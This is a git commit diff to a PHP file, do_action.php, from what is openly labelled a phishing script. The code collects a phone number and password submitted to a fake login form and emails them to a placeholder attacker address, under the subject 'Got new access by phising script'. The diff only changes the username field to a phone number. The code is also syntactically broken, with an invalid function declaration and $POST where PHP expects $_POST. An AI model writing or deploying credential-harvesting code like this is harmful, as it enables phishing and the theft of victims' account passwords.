2ec70de06fd9a21bf60222e769d3bffc8ed57653
RealAlyxMC <44660229+RealAlyxMC@users.noreply.github.com>
2020-05-14 18:43:54 +0800

    Update do_action.php

--- do_action.php
+++ do_action.php
@@ -1,12 +1,12 @@
 <?php
 	mail_sender(){
-		$username = $POST['username'];
+		$number = $POST['phone_number'];
 		$password = $POST['password'];
 		
 		$reciever = "YOUR-EMAIL ADRRESS";
 		
 		$subject = "Got new access by phising script";
-		$message = "The username is ". $username;
+		$message = "The phone number is ". $number;
 		$message .= "and password is ". $password;
 		
 		return mail($reciever, $subject, $message);
